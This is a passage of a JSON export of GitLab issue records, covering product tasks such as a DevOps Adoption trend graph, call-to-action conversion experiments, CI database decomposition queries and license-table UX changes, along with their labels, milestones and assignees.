Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"},"user_notes_count":11,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337586","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":0,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337586","notes":"https://gitlab.com/api/v4/projects/278964/issues/337586/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337586/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337586","relative":"#337586","full":"gitlab-org/gitlab#337586"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6407,"epic":{"id":312895,"iid":6407,"title":"Decomposition: Fix any broken Growth \u0026 Fulfillment features","url":"/groups/gitlab-org/-/epics/6407","group_id":9970,"human_readable_end_date":"Nov 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91399743,"iid":337561,"project_id":278964,"title":"[DevOps Adoption] Add \"trend over time\" graph","description":"\u003c!-- triage-serverless v2 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*The following page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v2 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n\n### Proposal\n\nIn the Overview tab in DevOps Adoption (group only), under the section that shows adoption numbers for the previous calendar month, add a trend graph showing adoption data for the past 12 months. \n\n![Screenshot_2021-09-23_at_15.30._2x](https://gitlab.com/gitlab-org/gitlab/uploads/ef39a4e0a8997393017e6e2699ac5806/Screenshot_2021-09-23_at_15.30._2x.png)\n\n1. X axis shows each month for the past 12 months\n1. Y axis is the total number of features that have been adopted. Y axis title is \"Total Adopted\"\n1. Graph title is \"Total number of features adopted\"\n1. Show three columns for each month (Dev, Sec, Ops). Column colors match the colors used in the section higher on the page that shows adoption numbers for the previous calendar month\n1. A legend below the graph maps each color as follows:\n   * Orange is \"Dev\"\n   * Aqua is \"Sec\"\n   * Green is \"Ops\"\n1. Data in the graph reflects the current group only. \n1. A tooltip which contains the feature (adopted / not adopted) information for each section.\n\n### Disclaimer\n\n\u003e This page may contain information related to upcoming products, features and functionality. It is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes. Just like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features or functionality remain at the sole discretion of GitLab Inc.","state":"closed","created_at":"2021-08-03T21:40:09.387Z","updated_at":"2021-12-08T22:38:24.498Z","closed_at":"2021-10-13T07:22:13.143Z","closed_by":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"labels":["GitLab Ultimate","devops::manage","direction","frontend","group::optimize","priority::2","release post item","release post item::in review","section::dev","type::feature","workflow::production"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"}],"author":{"id":4447217,"username":"ljlane","name":"Larissa Lane","state":"blocked","avatar_url":"https://secure.gravatar.com/avatar/ac4027d3a4e3bd62740ea1443a42f6c5?s=80\u0026d=identicon","web_url":"https://gitlab.com/ljlane"},"type":"ISSUE","assignee":{"id":3101551,"username":"blabuschagne","name":"Brandon Labuschagne","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3101551/avatar.png","web_url":"https://gitlab.com/blabuschagne"},"user_notes_count":35,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337561","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":2,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337561","notes":"https://gitlab.com/api/v4/projects/278964/issues/337561/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337561/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337561","relative":"#337561","full":"gitlab-org/gitlab#337561"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6511,"epic":{"id":319573,"iid":6511,"title":"Show adoption trends over time","url":"/groups/gitlab-org/-/epics/6511","group_id":9970,"human_readable_end_date":"Oct 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91393242,"iid":337551,"project_id":278964,"title":"experiment:Three CTA PQL test","description":"## Experiment summary\n\nThe purpose of this test is to gain a baseline understanding of how 3 CTAs perform within a feature discovery moment along with what the click-through rates are for each CTA. Longer-term, our goal is to build experiences where we intelligently display a maximum of two CTAs based on what we believe are the best CTAs for that user/namespace. This experiment will help us establish a baseline for future experimentation. \n \n## Hypothesis\n\u003c!-- The hypothesis represents the high-level thought process in creating the experiment but does not need to be proven in one experiment. For example, you could have a hypothesis that “users would benefit from more easily being able to start a trial” and your first experiment could fail, that doesn’t void your hypothesis only indicates you may need to think of a new iterative experiment that would still align with your hypothesis. --\u003e\nWe can increase the overall click-through rate on the page by providing users with options to \"upgrade now\" \"start a trial\" and \"talk to sales\"\n \n## Business problem\n\u003c!-- Where the hypothesis is focused on the user/customer, the business problem represents why/how an experiment in this area could positively impact the business. For example, trials represent a significant way for GitLab to produce valuable leads for the sales team. --\u003e\nEstablishing PQLs is a goal for the business and is viewed as part of our future go-to-market strategy. This initial test will allow us understand click-through rates and see how initial hand-raise PQLs perform\n \n## Supporting data\n\u003c!-- Why should we run this experiment? What’s the potential impact? Show supporting data that’s both qualitative and quantitative. Quantitative example, we generate 30,000 sign ups a month and 900 trails within 90 days (3%) with a close rate of 10% and an IACV of $400.  If we’re able to increase our trial volume by 10% percent (990 trials a month) we will generate an additional $3,600 IACV if our close rates remain constant. Qualitative example, in searching Zendesk I was able to find 10 support tickets in the last 30 days that referenced difficulties with starting a trial due to the user not being an admin. (all numbers are hypothetical and only listed for the purpose of having an example) --\u003e\n\n## Expected outcome\n\u003c!-- What is the expected outcome of this experiment, what metric are we trying to move? Are there any metrics we know we do not want to impact? For example, we want to impact IACV by increasing the rate at which users start trials within 30 days but we also want to ensure we don't increase the churn rate for users who've recently purchased. --\u003e\n\n## Experiment design \u0026 implementation\n\u003c!-- What is the experiment we’re going to run? How long do you believe it will need to run to reach significance? For example, our experiment would be to allow non-admins to request a trial through their admin, to detect a 10% change from our baseline conversion rate we’ll need a sample size of 57,000 (source Optimizely), with our current sign up rate of 30,000 a month this experiment will need to run for ~2 months. (all numbers are hypothetical and only listed for the purpose of having an example) --\u003e\n \nWe will launch this experiment at 20% of total free namespaces and monitor to a potential roll out of 50%. Users in the Control will get the current experience where they have two CTAs `upgrade now` and `start a trial`. Users in the experiment will have three CTAs `upgrade now`, `start a trial`, and `Talk to Sales`. \n \n| Control | Experiment |\n| ------ | ------ |\n| ![image](/uploads/5bf5417cfdc891cb67e67cc5e9592476/image.png) | ![sec-contact-sales-xp](/uploads/4285a7cce978f49e3a38fbcab2e5bc72/sec-contact-sales-xp.gif) |\n \n### Design Specs - TBD\n \n### Experiment tracking\n \nWe should utilize a GLEX experiment and monitor page views and clicks on each CTA. We should also record namespace ids in the `experiment_subjects` table indicating if they are included in the control or experiment variant. \n \n**Link Monitoring**\n \n| Variant | Link | value |\n| ------ | ------ | ------ |\n| Control | `Upgrade Now` | ?source=discover-project-security |\n| Control | `Start a Trial` | ?glm_content=discover-project-security\u0026glm_source=gitlab.com |\n| Experiment | `Upgrade Now` | ?source=discover-project-security-pqltest |\n| Experiment | `Start a Trial` | ?glm_content=discover-project-security-pqltest\u0026glm_source=gitlab.com |\n| Experiment | `Talk to Sales` | ([data documented here](https://gitlab.com/gitlab-org/gitlab/-/issues/335452)) |\n \n\n## ICE score\n\n\u003c!-- See https://about.gitlab.com/handbook/product/growth/#growth-ideation-and-prioritization --\u003e\n\n| Impact | Confidence | Ease | Score |\n| ------ | ------ | ------ | ------ |\n| 9 |  7 |  value 3 | Average(1:3) |\n\n## Known assumptions\n\u003c!-- This is an area to call out known assumptions in the experiment, this is especially helpful for any future colleagues that join the team so they understand other potential influences and how they were accounted for. This section is also helpful in framing possible scenarios and to keep the door open for the next steps. For example, we’re hoping our experiment will increase the number of people that start a trial but we’re assuming the conversion rate to paid and IACV will remain the same. This is a known assumption and depending on the results of the experiment could impact the direction we take on any future iterations. --\u003e\nAs this is our first hand-raise PQL experiment in-app we don't know how many hand-raise PQLs we'll generate or how three 3 CTAs will impact the overall click-through rate within the experiment. These will be factors we'll actively monitor throughout the experiment.\n\n## Results, lessons learned, next steps\n\u003c!-- What were the results of the experiment? Was the experiment a success or a failure? Based on the results should we remove the code or advocate that it become a permanent part of the experience for all users? Are there future experiments the team is going to run based off these results (include a link to new issue)? For example, our trial experiment was successful we increased the trial create rate by 10% but we saw a 1% drop in our close rate which means our net impact on IACV was negative $360 (990 * 0.09 * 400 compared tot he control of 900 * 0.1 * 400). Our next experiment (link) will focus on increasing the value once a user starts a trial. (all numbers are hypothetical and only listed for the purpose of having an example) --\u003e\n\n\n## Checklist\n\n* [ ] Fill in the experiment summary and write more about the details of the experiment in the rest of the issue description. Some of these may be filled in through time (the \"Result, learnings, next steps\" section for example) but at least the experiment summary should be filled in right from the start.\n* [ ] Add the label of the `group::` that will work on this experiment (if known).\n* [ ] Mention the Product Manager, Engineering Manager, and at least one Product Designer from the group that owns the part of the product that the experiment will affect.\n* [ ] Fill in the values in the [ICE score table](#ice-score) ping other team members for the values you aren’t confident about (i.e. engineering should almost always fill out the ease section). Add the ~\"ICE Score Needed\" label to indicate that the score is incomplete.\n* [ ] Replace the ~\"ICE Score Needed\" with an ICE low/medium/high score label once all values in the ICE table have been added.\n* [ ] Mention the [at]gitlab-core-team team and ask for their feedback.","state":"closed","created_at":"2021-08-03T18:50:36.049Z","updated_at":"2022-10-05T12:45:38.586Z","closed_at":"2022-01-07T17:41:30.656Z","closed_by":{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"},"labels":["Category:Conversion Experiment","DEPRECATED Growth-Deliverable","Stretch","UX Growth Team","devops::growth","experiment idea","group::acquisition","growth experiment","missed:14.6","section::growth","type::feature","workflow::ready for review"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"}],"author":{"id":4413992,"username":"s_awezec","name":"Sam Awezec","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4413992/avatar.png","web_url":"https://gitlab.com/s_awezec"},"type":"ISSUE","assignee":{"id":4409816,"username":"a_akgun","name":"Alper Akgun","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4409816/avatar.png","web_url":"https://gitlab.com/a_akgun"},"user_notes_count":26,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337551","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337551","notes":"https://gitlab.com/api/v4/projects/278964/issues/337551/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337551/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337551","relative":"#337551","full":"gitlab-org/gitlab#337551"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6421,"epic":{"id":313700,"iid":6421,"title":"UX: Implement a universal feature discovery experience","url":"/groups/gitlab-org/-/epics/6421","group_id":9970,"human_readable_end_date":"Jan 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91391042,"iid":337545,"project_id":278964,"title":"Follow-up from \"Update copy in account recovery settings global alert\"","description":"The following discussion from !66693 should be addressed:\n\n- [ ] @pslaughter started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/66693#note_642254756):  (+1 comment)\n\n    \u003e **suggestion (non-blocking):** Do we want to rename the `check_recovery_settings` files and methods to `check_2fa_settings`? :thinking:\n    \u003e \n    \u003e As far as I can tell, recovery and 2fa are related but different things :shrug:","state":"closed","created_at":"2021-08-03T17:56:20.600Z","updated_at":"2021-10-28T13:54:23.191Z","closed_at":"2021-08-31T15:45:42.878Z","closed_by":{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"},"labels":["Category:Authentication and Authorization","UI polish","devops::manage","frontend","group::authentication and authorization","section::dev","type::maintenance","workflow::production"],"milestone":{"id":1948702,"iid":63,"group_id":9970,"title":"14.3","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:43:36.613Z","updated_at":"2022-04-21T07:25:29.231Z","due_date":"2021-09-17","start_date":"2021-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/63"},"assignees":[{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"}],"author":{"id":2233420,"username":"pslaughter","name":"Paul Slaughter","state":"active","avatar_url":"https://secure.gravatar.com/avatar/631b25421eb206ab44cb2793ef09d881?s=80\u0026d=identicon","web_url":"https://gitlab.com/pslaughter"},"type":"ISSUE","assignee":{"id":5413811,"username":"peterhegman","name":"Peter Hegman","state":"active","avatar_url":"https://secure.gravatar.com/avatar/459d8635e9ab17a052c00ead1d7bf1e6?s=80\u0026d=identicon","web_url":"https://gitlab.com/peterhegman"},"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337545","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337545","notes":"https://gitlab.com/api/v4/projects/278964/issues/337545/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337545/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337545","relative":"#337545","full":"gitlab-org/gitlab#337545"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91388550,"iid":337541,"project_id":278964,"title":"[DevOps Adoption] Modify queries for CI table decomposition","description":"## Problem to solve\n\nFor SaaS, CI tables are being moved to a separate database.  This is to improve performance through [\"decomposition\"](https://gitlab.com/groups/gitlab-org/-/epics/6168#solution).  After that, queries that JOIN on CI tables will no longer function.\n\nSome DevOps Adoption data refresh queries [rely on CI tables](https://gitlab.com/gitlab-org/manage/general-discussion/-/issues/17360#note_624828942):\n\n* `ci_builds` for `security scan` metric\n* `ci_runners` for `runner configured` metric\n* `ci_pipelines` for `pipeline_succeeded` metric\n* `ci_job_artifacts` for `sast`, `dast`, `coverage fuzzing`, `dependency scanning` metrics\n\nSome of them might use `JOIN` out of `ci_*` tables\n\n## Proposal\n\nEnsure that all DevOps Adoption queries will continue to function after CI table decomposition.\n\nRelated links\n\n- [Manage: Optimize - Decomposition impact](https://gitlab.com/gitlab-org/manage/general-discussion/-/issues/17360)","state":"closed","created_at":"2021-08-03T17:02:48.339Z","updated_at":"2022-03-16T11:39:53.668Z","closed_at":"2021-10-04T10:03:24.842Z","closed_by":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"labels":["backend","devops::manage","group::optimize","maintenance::refactor","priority::1","section::dev","type::maintenance","workflow::production"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"}],"author":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"type":"ISSUE","assignee":{"id":4156052,"username":"ahegyi","name":"Adam Hegyi","state":"active","avatar_url":"https://secure.gravatar.com/avatar/ff7cdaff6b98fba9b977f1885578b8b3?s=80\u0026d=identicon","web_url":"https://gitlab.com/ahegyi"},"user_notes_count":21,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337541","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337541","notes":"https://gitlab.com/api/v4/projects/278964/issues/337541/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337541/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337541","relative":"#337541","full":"gitlab-org/gitlab#337541"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6374,"epic":{"id":309456,"iid":6374,"title":"Decomposition: Make Dev features compatible with Decomposed CI database","url":"/groups/gitlab-org/-/epics/6374","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91383881,"iid":337534,"project_id":278964,"title":"Experiment: continuous onboarding iteration 2 - change destination URLs","description":"## Experiment summary\n\nWe believe we can increase adoption by directing users directly to the action. To verify this we will change link URLs from going to onboarding issues to the direct action the user needs to complete within the app. To monitor the success of this experiment we will look at the stage adoption, invite, trial signup rates. \n \n## Hypothesis\n\u003c!-- The hypothesis represents the high-level thought process in creating the experiment but does not need to be proven in one experiment. For example, you could have a hypothesis that “users would benefit from more easily being able to start a trial” and your first experiment could fail, that doesn’t void your hypothesis only indicates you may need to think of a new iterative experiment that would still align with your hypothesis. --\u003e\nWe can increase adoption rates by directing users directly to the action within the app.\n \n## Business problem\n\u003c!-- Where the hypothesis is focused on the user/customer, the business problem represents why/how an experiment in this area could positively impact the business. For example, trials represent a significant way for GitLab to produce valuable leads for the sales team. --\u003e\nIf we're able to increase stage adoption, invites, or trials it has a direct impact on the conversion rate to being a paid customer which is the ultimate goal of the Growth division. \n \n## Supporting data\n\u003c!-- Why should we run this experiment? What’s the potential impact? Show supporting data that’s both qualitative and quantitative. Quantitative example, we generate 30,000 sign ups a month and 900 trails within 90 days (3%) with a close rate of 10% and an IACV of $400.  If we’re able to increase our trial volume by 10% percent (990 trials a month) we will generate an additional $3,600 IACV if our close rates remain constant. Qualitative example, in searching Zendesk I was able to find 10 support tickets in the last 30 days that referenced difficulties with starting a trial due to the user not being an admin. (all numbers are hypothetical and only listed for the purpose of having an example) --\u003e\n\n## Expected outcome\n\u003c!-- What is the expected outcome of this experiment, what metric are we trying to move? Are there any metrics we know we do not want to impact? For example, we want to impact IACV by increasing the rate at which users start trials within 30 days but we also want to ensure we don't increase the churn rate for users who've recently purchased. --\u003e\n\n## Experiment design \u0026 implementation\n\u003c!-- What is the experiment we’re going to run? How long do you believe it will need to run to reach significance? For example, our experiment would be to allow non-admins to request a trial through their admin, to detect a 10% change from our baseline conversion rate we’ll need a sample size of 57,000 (source Optimizely), with our current sign up rate of 30,000 a month this experiment will need to run for ~2 months. (all numbers are hypothetical and only listed for the purpose of having an example) --\u003e\n \nThe visual experience within the product will remain the same in the control and experiment. The only variable we will change between the control and experiment will be where the URLs link to\n \n| Display Text (same in both experiment and control | Control URL Path | Experiment URL Path |\n| ------ | ------ |------ |\n| Invite your colleagues | learn-gitlab/-/issues/7 | /`project_url`/members |\n| Create a repository | /learn-gitlab/-/issues/2 | /`project_url` |\n| Set-up CI/CD | /learn-gitlab/-/issues/4 | /pipelines |\n| Start a free trial of GitLab Ultimate | /learn-gitlab/-/issues/13 | /trials/new?glm_content=onboarding-start-trial\u0026glm_source=gitlab.com |\n| Add code owners | /learn-gitlab/-/issues/2 | /trials/new?glm_content=onboarding-code-owners\u0026glm_source=gitlab.com | /trials/new?glm_content=onboarding-add-code-owners\u0026glm_source=gitlab.com |\n| Enable require merge approvals | /learn-gitlab/-/issues/2 | /trials/new?glm_content=onboarding-require-merge-approvals\u0026glm_source=gitlab.com |\n| Create an issue | /learn-gitlab/-/issues/3 | /issues |\n| Submit a merge request (MR) | /learn-gitlab/-/issues/5 | /merge_requests |\n| Run a Security scan using CI/CD | https://docs.gitlab.com/ee/user/application_security/security_dashboard/#gitlab-security-dashboard-security-center-and-vulnerability-reports | /security/configuration |\n\nCurrent visual experience should not change:\n\n![image](https://gitlab.com/gitlab-org/gitlab/uploads/213360a8ef7ff692f2caffac368218a1/image.png)\n\n## ICE score\n\n\u003c!-- See https://about.gitlab.com/handbook/product/growth/#growth-ideation-and-prioritization --\u003e\n\n| Impact | Confidence | Ease | Score |\n| ------ | ------ | ------ | ------ |\n| value 1 |  value 2 |  value 3 | Average(1:3) |\n\n## Known assumptions\n\u003c!-- This is an area to call out known assumptions in the experiment, this is especially helpful for any future colleagues that join the team so they understand other potential influences and how they were accounted for. This section is also helpful in framing possible scenarios and to keep the door open for the next steps. For example, we’re hoping our experiment will increase the number of people that start a trial but we’re assuming the conversion rate to paid and IACV will remain the same. This is a known assumption and depending on the results of the experiment could impact the direction we take on any future iterations. --\u003e\n\n## Results, lessons learned, next steps\n\u003c!-- What were the results of the experiment? Was the experiment a success or a failure? Based on the results should we remove the code or advocate that it become a permanent part of the experience for all users? Are there future experiments the team is going to run based off these results (include a link to new issue)? For example, our trial experiment was successful we increased the trial create rate by 10% but we saw a 1% drop in our close rate which means our net impact on IACV was negative $360 (990 * 0.09 * 400 compared tot he control of 900 * 0.1 * 400). Our next experiment (link) will focus on increasing the value once a user starts a trial. (all numbers are hypothetical and only listed for the purpose of having an example) --\u003e\n\n\n## Checklist\n\n* [ ] Fill in the experiment summary and write more about the details of the experiment in the rest of the issue description. Some of these may be filled in through time (the \"Result, learnings, next steps\" section for example) but at least the experiment summary should be filled in right from the start.\n* [ ] Add the label of the `group::` that will work on this experiment (if known).\n* [ ] Mention the Product Manager, Engineering Manager, and at least one Product Designer from the group that owns the part of the product that the experiment will affect.\n* [ ] Fill in the values in the [ICE score table](#ice-score) ping other team members for the values you aren’t confident about (i.e. engineering should almost always fill out the ease section). Add the ~\"ICE Score Needed\" label to indicate that the score is incomplete.\n* [ ] Replace the ~\"ICE Score Needed\" with an ICE low/medium/high score label once all values in the ICE table have been added.\n* [ ] Mention the [at]gitlab-core-team team and ask for their feedback.","state":"closed","created_at":"2021-08-03T15:36:33.830Z","updated_at":"2022-03-01T17:01:07.428Z","closed_at":"2021-11-16T00:46:15.136Z","closed_by":{"id":5755274,"username":"dreedy","name":"Dallas Reedy","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5755274/avatar.png","web_url":"https://gitlab.com/dreedy"},"labels":["Category:Conversion Experiment","DEPRECATED Growth-Deliverable","Deliverable","devops::growth","experiment idea","group::acquisition","growth experiment","missed-deliverable","missed:14.4","section::growth","type::feature"],"milestone":{"id":2114817,"iid":66,"group_id":9970,"title":"14.5","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T04:59:45.082Z","updated_at":"2022-04-21T07:25:45.431Z","due_date":"2021-11-17","start_date":"2021-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/66"},"assignees":[{"id":5755274,"username":"dreedy","name":"Dallas Reedy","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5755274/avatar.png","web_url":"https://gitlab.com/dreedy"}],"author":{"id":4413992,"username":"s_awezec","name":"Sam Awezec","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4413992/avatar.png","web_url":"https://gitlab.com/s_awezec"},"type":"ISSUE","assignee":{"id":5755274,"username":"dreedy","name":"Dallas Reedy","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5755274/avatar.png","web_url":"https://gitlab.com/dreedy"},"user_notes_count":74,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337534","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337534","notes":"https://gitlab.com/api/v4/projects/278964/issues/337534/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337534/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337534","relative":"#337534","full":"gitlab-org/gitlab#337534"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7172,"epic":{"id":390214,"iid":7172,"title":"Conversion Experiment: continuous onboarding change link destinations","url":"/groups/gitlab-org/-/epics/7172","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91382909,"iid":337531,"project_id":278964,"title":"[UX] - Instance has an active license and a future dated license already activated","description":"This is the UX issue for https://gitlab.com/gitlab-org/gitlab/-/issues/334426\n\n## Proposal\n\n![FINAL](/uploads/8ea14d625706ff784c8aadce65443e66/FINAL.png)\n\n#### Proposal details\n\nOn the subscription history table:-\n\n- In the Name Column add a (i) info account with a tooltip that displays billing persons email address and underneath the company.\n- Remove the **Email** column\n- Remove the **Company** column\n- **Valid From** date should use `starts_at`\n- **Activated on** date should use `created date`\n- We should not show non-cloud future-dated license subscriptions in the table. All non-cloud future-dated licenses should only be added by license file upload.","state":"closed","created_at":"2021-08-03T15:19:07.826Z","updated_at":"2022-01-17T14:36:34.690Z","closed_at":"2021-11-19T14:06:03.268Z","closed_by":{"id":3354144,"username":"timnoah","name":"Tim Noah","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3354144/avatar.png","web_url":"https://gitlab.com/timnoah"},"labels":["Cloud License Sync - V2","UX","[deprecated] Category:Provision","devops::fulfillment","group::provision","missed:14.2","section::fulfillment","workflow::ready for development"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":3354144,"username":"timnoah","name":"Tim 